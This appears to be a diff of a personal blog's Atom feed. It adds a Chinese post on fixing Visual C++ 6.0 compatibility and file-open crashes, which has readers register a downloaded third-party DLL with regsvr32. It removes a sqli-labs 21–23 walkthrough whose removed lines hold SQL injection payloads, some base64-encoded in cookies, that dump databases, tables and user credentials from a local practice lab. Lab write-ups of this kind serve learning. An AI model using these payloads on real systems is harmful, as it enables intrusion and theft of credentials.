@@ -6,7 +6,7 @@
   <link href="https://quan9i.github.io/atom.xml" rel="self"/>
   
   <link href="https://quan9i.github.io/"/>
-  <updated>2022-02-22T03:12:31.175Z</updated>
+  <updated>2022-02-22T09:47:52.063Z</updated>
   <id>https://quan9i.github.io/</id>
   
   <author>
@@ -15,6 +15,27 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>vc 6.0++解决兼容性及闪退问题</title>
+    <link href="https://quan9i.github.io/vc++/"/>
+    <id>https://quan9i.github.io/vc++/</id>
+    <published>2022-02-22T09:44:54.684Z</published>
+    <updated>2022-02-22T09:47:52.063Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://img-blog.csdnimg.cn/be0b0ffce75a4f188d00a8d733b4fc38.png" alt="在这里插入图片描述"><br>去发光，而不是被照亮</p><span id="more"></span><h1><span id="前言">前言</span></h1><p>文章同步于我的个人博客，欢迎大家访问<br>我在安装好vc6.0后出现了如下问题，总结如下</p><h1><span id="不兼容">不兼容</span></h1><p>在安装完成后运行程序会出现不兼容的情况，如下图所示<br><img src="https://img-blog.csdnimg.cn/bdd0fdd24e1049ba85f9160366f3a540.png" alt="在这里插入图片描述">此时我们右键一下，然后选择打开文件所在位置<br><img src="https://img-blog.csdnimg.cn/a315f9a32132457d85036f4e38b838d3.png" alt="在这里插入图片描述"><br>找到MSDEV文件，并更名为MSDEV2<img src="https://img-blog.csdnimg.cn/d3cdd4d5c4be493782583c84c429714d.png" alt="在这里插入图片描述"></p><p>此时我们右键快捷方式，点击属性<br><img src="https://img-blog.csdnimg.cn/e122d1a2cc7c4a89b1b4f4d0a8f8c216.png" alt="在这里插入图片描述"><br>把文件名改为刚刚更改的MSDEV2<br><img src="https://img-blog.csdnimg.cn/37178e76ea924b738f66797f854d5129.png" alt="在这里插入图片描述"></p><p>此时再切换到兼容性一栏，勾选下方以兼容模式运行程序<br><img src="https://img-blog.csdnimg.cn/8e4d237e008547658401e7ff12a29da8.png" alt="在这里插入图片描述"><br>最后点击应用，再点确定即可<br>此时再次运行程序，发现可以正常打开<br><img src="https://img-blog.csdnimg.cn/cf8319691e3d4b6da38f337e1e18a5fd.png" alt="在这里插入图片描述"></p><h1><span id="打开文件闪退">打开文件闪退</span></h1><p><img src="https://img-blog.csdnimg.cn/488a2cad70774e2c870a1bac897c2d12.png" alt="在这里插入图片描述">在点击这个的时候，我发现程序会闪退，针对这个的解决方法如下所示<br>想法是在程序中自己添加一个打开文件的选项，这里引用别人写好的dll文件来运行即可，具体步骤如下：</p><p>1、<br>首先下载一个dll文件，链接如下<a href="https://pan.baidu.com/s/1c0GImvI">https://pan.baidu.com/s/1c0GImvI</a><br>下载后解压到<code>&quot;D:\c语言\vc+\Microsoft Visual Studio\Common\MSDev98\AddIns\&quot;</code>（路径需要看自己安装的路径，大部分人默认安装的话是在c盘，在c盘中找到Microsoft Visual Studio\Common\MSDev98\，放在这个路径下即可）如下图<br><img src="https://img-blog.csdnimg.cn/6b8e6adbbe054a0eb42bebc49a53f6db.png" alt="在这里插入图片描述">此时在搜索框中搜索cmd，选择以管理员身份运行<img src="https://img-blog.csdnimg.cn/ac14dd250221464abbafac086fa28e91.png" alt="在这里插入图片描述"><br>输入代码如下<br><font color="red">注:这个路径需要更改为你们的路径，文件放到路径下后右键可以复制文件路径</font></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regsvr32 <span class="string">&quot;D:\c语言\vc+\Microsoft Visual Studio\Common\MSDev98\AddIns\FileTool.dll&quot;</span></span><br></pre></td></tr></table></figure><p>成功执行后会出现如下结果<br><img src="https://img-blog.csdnimg.cn/091ed656258e412abc807206988e4058.png" alt="在这里插入图片描述"><br>此时打开vc选择工具中的定制<br><img src="https://img-blog.csdnimg.cn/0527d0a10b7949c28bd4f2c1a8ed5da8.png" alt="在这里插入图片描述"><br>选择最后一个，勾选第一个<br><img src="https://img-blog.csdnimg.cn/bc3e1c9164d6497fb3d455a9a624c5d9.png" alt="在这里插入图片描述"><br>关闭后发现程序多了个东西<br><img src="https://img-blog.csdnimg.cn/766d6e86ac464d1c9838656fb04bb55b.png" alt="在这里插入图片描述">A的全拼·Add File to Project<br>O的全拼：·Open<br>但是这样的话不是很美观，左键拖动这个正方形到上面，可以放入框中<br><img src="https://img-blog.csdnimg.cn/1fc27a5e22ce464199ad8b0b44d6bcbd.png" alt="在这里插入图片描述"></p><p>点击o即可选择文件<br><img src="https://img-blog.csdnimg.cn/52a55904e303477fa1bb1d859dfc137f.png" alt="在这里插入图片描述"></p><p>问题解决完成</p><p>本人只是小白，如果出现问题还请各位师傅多多指教！</p>]]></content>
+    
+    
+    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/be0b0ffce75a4f188d00a8d733b4fc38.png&quot; alt=&quot;在这里插入图片描述&quot;&gt;&lt;br&gt;去发光，而不是被照亮&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="c" scheme="https://quan9i.github.io/categories/c/"/>
+    
+    
+    <category term="语言学习" scheme="https://quan9i.github.io/tags/%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"/>
+    
+  </entry>
   
   <entry>
     <title>codeblock报错解决及正确安装</title>
@@ -405,27 +426,6 @@
     
     
     <summary type="html">&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/0b1ba268322a4a82be63d97925a19961.png&quot; alt=&quot;在这里插入图片描述&quot;&gt;&lt;br&gt;愿做人间逍遥客，从此江湖无故人&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="post注入" scheme="https://quan9i.github.io/categories/post%E6%B3%A8%E5%85%A5/"/>
-    
-    
-    <category term="sql注入" scheme="https://quan9i.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>sql-lab 21-23</title>
-    <link href="https://quan9i.github.io/post%E6%B3%A8%E5%85%A52/"/>
-    <id>https://quan9i.github.io/post%E6%B3%A8%E5%85%A52/</id>
-    <published>2022-01-19T06:44:56.793Z</published>
-    <updated>2022-01-17T14:17:42.000Z</updated>
-    
-    <content type="html"><![CDATA[<p><img src="https://img-blog.csdnimg.cn/7268b3f26b534cc0a370b09185b2e233.png" alt="在这里插入图片描述"><br>要在平淡的日子里继续闪烁，要在芸芸众生中脱颖而出。</p><span id="more"></span><h1><span id="sql-lab-21">sql-lab 21</span></h1><p>首先登录进去<br><img src="https://img-blog.csdnimg.cn/d64abe76848641e3bff186023b08cba5.png" alt="在这里插入图片描述"><br>发现coookie变成<code>uname=YWRtaW4%3D</code>，可见采用了base64编码进行转换<br>此时可采用base64位编码输出代码</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">0</span><span class="string">&#x27;union select 1,2,database() #</span></span><br></pre></td></tr></table></figure><p>转换后为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span>MCd1bmlvbiBzZWxlY3QgMSwyLGRhdGFiYXNlKCkgIw<span class="operator">=</span><span class="operator">=</span></span><br></pre></td></tr></table></figure><p>执行后发现报错，此时想到可能unname的包裹方式不是’，此时进行逐个尝试，在尝试到’)发现回显出了正确的数据库,如图所示<br><img src="https://img-blog.csdnimg.cn/36a347ea9d1145928a84c4978f2dde6d.png" alt="在这里插入图片描述"><br>其他猜解语句也同之前一样，唯一不同的是需要将语句转换成base63编码</p><h1><span id="sql-lab-22">sql-lab 22</span></h1><p>登录进去后<br><img src="https://img-blog.csdnimg.cn/36f3044f592a40a38329041d05e6daa5.png" alt="在这里插入图片描述"><br>发现也是以base64编码传入的uname<br>试试刚才的payload，发现报错，此时想到unname的包裹方式可能不同，开始尝试，在包裹方式为”时发现正确回显，此时查询当前数据库的payload为<code>uname=dW5hbWU9MCIgdW5pb24gc2VsZWN0IDEsMixkYXRhYmFzZSgpICM=</code><br><img src="https://img-blog.csdnimg.cn/66fb0389873d43dbaee12ae9287b86ee.png" alt="在这里插入图片描述"></p><h2><span id="查看所有数据库">查看所有数据库</span></h2><p><code>uname=dW5hbWU9MCIgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQoc2NoZW1hX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnNjaGVtYXRhICM=</code><br>执行结果<br><img src="https://img-blog.csdnimg.cn/36ccffd0ef48422fb143f8291e05c756.png" alt="在这里插入图片描述"></p><h2><span id="查询表名">查询表名</span></h2><p><code>uname=dW5hbWU9MCIgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT0nc2VjdXJpdHknICM=</code><br>执行结果<br><img src="https://img-blog.csdnimg.cn/e84ccbb1bea84385af38b7c29f26e9e8.png" alt="在这里插入图片描述"></p><h2><span id="查询列名">查询列名</span></h2><p><code>uname=dW5hbWU9MCIgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQoY29sdW1uX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfbmFtZT0ndXNlcnMnICM=</code><br><img src="https://img-blog.csdnimg.cn/a657493c6dee4099940a9dd264aea9d3.png" alt="在这里插入图片描述"></p><h2><span id="查询字段">查询字段</span></h2><p><code>uname=dW5hbWU9MCIgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQoJ34nLGlkLHVzZXJuYW1lLHBhc3N3b3JkKSBmcm9tIHNlY3VyaXR5LnVzZXJzIw==</code><br><img src="https://img-blog.csdnimg.cn/35cd1aaf4e3842d498781d2ce97c5b45.png" alt="在这里插入图片描述"><br>查询其他类似信息不再赘述</p><h1><span id="sql-lab-23">sql-lab 23</span></h1><p>进入界面后发现让输入id，测试出用单引号包裹id，以get方式传入数据后，发现无法被执行<br><img src="https://img-blog.csdnimg.cn/1678e2e56e9b4d1e87504518e31d7f9c.png" alt="在这里插入图片描述"><br>此时再将注释符换成#，也无法执行，说明可能注释符在这里被进行了转换，因此此时我们可以用单引号来进行闭合语句<br>payload为<code>id=0&#39; union select 1,2,&#39;3</code>或<code>id=0&#39; union select 1,2,3 or &#39;1&#39;=&#39;1</code></p><h2><span id="查询所有数据库">查询所有数据库</span></h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8080</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>Less<span class="number">-23</span><span class="operator">/</span>?id<span class="operator">=</span><span class="string">&#x27; union select 1,database(),3 or &#x27;</span><span class="number">1</span><span class="string">&#x27;= &#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/d8d3080227a647e08d05d9dd2a1ce691.png" alt="在这里插入图片描述"></p><h2><span id="查询表名">查询表名</span></h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8080</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>Less<span class="number">-23</span><span class="operator">/</span>?id<span class="operator">=</span><span class="string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() and &#x27;</span><span class="number">1</span><span class="string">&#x27;= &#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/13dba26f442845a2b2030889e72d0fd6.png" alt="在这里插入图片描述"><br>此处有个我解决不了的问题，我暂时将其记录下来，如果有大佬知道原因，希望可以帮助我一下，这个问题就是当把最后的and换成or时，按理说是可以得到当前数据库的表名的，可是却得到了infromation_schema数据库的全部表名<br><img src="https://img-blog.csdnimg.cn/cfccaa7c83f341a2b9160ba4349bcd41.png" alt="在这里插入图片描述"><br>而当or语句后面的’1’=’1，换成错误语句，例如’1’=’0,此时会正确的报出当前数据库的表名<br><img src="https://img-blog.csdnimg.cn/517441cd2c6f48739c27ecd2eef980cc.png" alt="在这里插入图片描述"><br>查询其他与之前类似，在这里不再赘述。</p>]]></content>
-    
-    
-    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/7268b3f26b534cc0a370b09185b2e233.png&quot; alt=&quot;在这里插入图片描述&quot;&gt;&lt;br&gt;要在平淡的日子里继续闪烁，要在芸芸众生中脱颖而出。&lt;/p&gt;</summary>
     
     
     
